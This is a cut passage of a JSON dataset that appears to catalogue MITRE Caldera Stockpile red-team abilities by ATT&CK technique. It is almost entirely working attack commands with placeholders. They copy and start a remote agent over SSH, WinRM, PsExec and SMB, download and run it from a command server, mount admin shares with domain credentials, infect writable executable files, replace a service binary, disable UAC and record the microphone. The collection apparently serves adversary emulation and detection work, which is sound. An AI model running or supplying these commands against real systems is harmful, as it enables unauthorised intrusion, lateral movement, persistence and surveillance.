".\\Invoke-MemeKatz.ps1\n", "payloads": ["Invoke-MemeKatz.ps1"]}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payloads": ["Invoke-MemeKatz.ps1"]}}}}}], "command_list": ["Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'", "echo \"proof that this machine was hacked.\" > message.txt", "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"", ".\\Invoke-MemeKatz.ps1"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1565.001", "commands": [{"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": "./mission.go -duration 60 -extension .caldera -dir '/'", "name": "Hunts for files of a certain extension and inserts a message"}, {"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": "./mission.go -duration 60 -extension .caldera -dir '/'", "name": "Hunts for files of a certain extension and inserts a message"}, {"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "name": "Hunts for files of a certain extension and inserts a message"}, {"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "name": "Hunts for files of a certain extension and inserts a message"}], "parsed_datasets": [{"Mitre Stockpile - Hunts for files of a certain extension and inserts a message": {"description": "Hunts for files of a certain extension and inserts a message", "id": "55f9600a-756f-496b-b27f-682052dc429c", "name": "File Hunter Mission", "platforms": {"darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "windows": {"cmd": {"command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "payloads": ["mission.go"]}, "psh": {"command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "payloads": ["mission.go"]}}}, "tactic": "impact", "technique": {"attack_id": "T1565.001", "name": "Data Manipulation: Stored Data Manipulation"}}}], "command_list": ["copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "./mission.go -duration 60 -extension .caldera -dir '/'"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1496", "commands": [{"source": "data/abilities/impact/78524da1-f347-4fbb-9295-209f1f408330.yml", "command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "name": "Install sox and record microphone for n-seconds"}], "parsed_datasets": [{"Mitre Stockpile - Install sox and record microphone for n-seconds": {"id": "78524da1-f347-4fbb-9295-209f1f408330", "name": "Record microphone", "description": "Install sox and record microphone for n-seconds", "tactic": "impact", "technique": {"attack_id": "T1496", "name": "Resource Hijacking"}, "platforms": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}}}], "command_list": ["brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.004", "commands": [{"source": "data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "name": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication"}, {"source": "data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "name": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication"}], "parsed_datasets": [{"Mitre Stockpile - Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication": {"id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "name": "Start 54ndc47", "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.004", "name": "Remote Services: SSH"}, "platforms": {"darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}}}], "command_list": ["scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.006", "commands": [{"source": "data/abilities/lateral-movement/3734aa1e-c536-42b3-8912-4c91b8bdce90.yml", "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n", "name": "Copy Sandcat file using PowerShell"}], "parsed_datasets": [{"Mitre Stockpile - Copy Sandcat file using PowerShell": {"id": "3734aa1e-c536-42b3-8912-4c91b8bdce90", "description": "Copy Sandcat file using PowerShell", "name": "Copy Sandcat File using Powershell", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.006", "name": "Remote Services: Windows Remote Management"}, "platforms": {"windows": {"psh": {"command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n", "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName", "payloads": ["sandcat.go-windows"]}}}}}], "command_list": ["$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.002", "commands": [{"source": "data/abilities/lateral-movement/40161ad0-75bd-11e9-b475-0800200c9a66.yml", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n", "name": "Mounts a network file share on a target computer"}], "parsed_datasets": [{"Mitre Stockpile - Mounts a network file share on a target computer": {"id": "40161ad0-75bd-11e9-b475-0800200c9a66", "name": "Net use", "description": "Mounts a network file share on a target computer", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "platforms": {"windows": {"psh": {"command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n", "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"}}}}}], "command_list": ["net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.006", "commands": [{"source": "data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "name": "Start Agent using WinRM (WinRM)"}], "parsed_datasets": [{"Mitre Stockpile - Start Agent using WinRM (WinRM)": {"id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "name": "Start Agent (WinRM)", "description": "Start Agent using WinRM (WinRM)", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.006", "name": "Remote Services: Windows Remote Management"}, "platforms": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}}}], "command_list": ["$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1570", "commands": [{"source": "data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml", "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "name": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP"}, {"source": "data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "name": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP"}, {"source": "data/abilities/lateral-movement/4908fdc4-74fc-4d7c-8935-26d11ad26a8d.yml", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "name": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP"}, {"source": "data/abilities/lateral-movement/620b674a-7655-436c-b645-bc3e8ea51abd.yml", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n", "name": "Copy Sandcat file using PsExec on CMD"}], "parsed_datasets": [{"Mitre Stockpile - Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP": {"id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "name": "Copy 54ndc47 (WinRM and SCP)", "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "tactic": "lateral-movement", "technique": {"attack_id": "T1570", "name": "Lateral Tool Transfer"}, "platforms": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}}}, {"Mitre Stockpile - Copy Sandcat file using PsExec on CMD": {"id": "620b674a-7655-436c-b645-bc3e8ea51abd", "description": "Copy Sandcat file using PsExec on CMD", "name": "Copy Sandcat File using PsExec on CMD", "tactic": "lateral-movement", "technique": {"attack_id": "T1570", "name": "Lateral Tool Transfer"}, "platforms": {"windows": {"cmd": {"cleanup": "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe", "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n", "payloads": ["sandcat.go-windows"]}}}}}], "command_list": ["$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location.replace($exe, \"sandcat.go-windows\") -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;", "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go", "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go", "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.002", "commands": [{"source": "data/abilities/lateral-movement/65048ec1-f7ca-49d3-9410-10813e472b30.yml", "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "name": "Copy 54ndc47 to remote host (SMB)"}], "parsed_datasets": [{"Mitre Stockpile - Copy 54ndc47 to remote host (SMB)": {"id": "65048ec1-f7ca-49d3-9410-10813e472b30", "name": "Copy 54ndc47 (SMB)", "description": "Copy 54ndc47 to remote host (SMB)", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}], "command_list": ["$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1021.002", "commands": [{"source": "data/abilities/lateral-movement/aa6ec4dd-db09-4925-b9b9-43adeb154686.yml", "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "name": "Mount a windows share"}], "parsed_datasets": [{"Mitre Stockpile - Mount a windows share": {"id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "name": "Mount Share", "description": "Mount a windows share", "tactic": "lateral-movement", "technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "platforms": {"windows": {"psh": {"command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}], "command_list": ["net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1543.003", "commands": [{"source": "data/abilities/persistence/52771610-2322-44cf-816b-a7df42b4c086.yml", "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n", "name": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n"}], "parsed_datasets": [{"Mitre Stockpile - This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n": {"id": "52771610-2322-44cf-816b-a7df42b4c086", "name": "Replace a service binary with alternate binary", "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n", "tactic": "persistence", "technique": {"attack_id": "T1543.003", "name": "Create or Modify System Process: Windows Service"}, "platforms": {"windows": {"psh": {"command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n", "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.service.modifiable"}]}]}}], "command_list": ["$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1574.010", "commands": [{"source": "data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml", "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "name": "Locate and infect files with weak but executable perms"}, {"source": "data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml", "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "name": "Locate and infect files with weak but executable perms"}], "parsed_datasets": [{"Mitre Stockpile - Locate and infect files with weak but executable perms": {"id": "10681f2f-be03-44af-858d-f2b0812df185", "name": "Weak executable files", "description": "Locate and infect files with weak but executable perms", "tactic": "privilege-escalation", "technique": {"attack_id": "T1574.010", "name": "Hijack Execution Flow: Services File Permissions Weakness"}, "platforms": {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}}}}], "command_list": ["find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"", "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\""], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1548.002", "commands": [{"source": "data/abilities/privilege-escalation/665432a4-42e7-4ee1-af19-a9a8c9455d0c.yml", "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n", "name": "Set a registry key to allow UAC bypass"}], "parsed_datasets": [{"Mitre Stockpile - Set a registry key to allow UAC bypass": {"description": "Set a registry key to allow 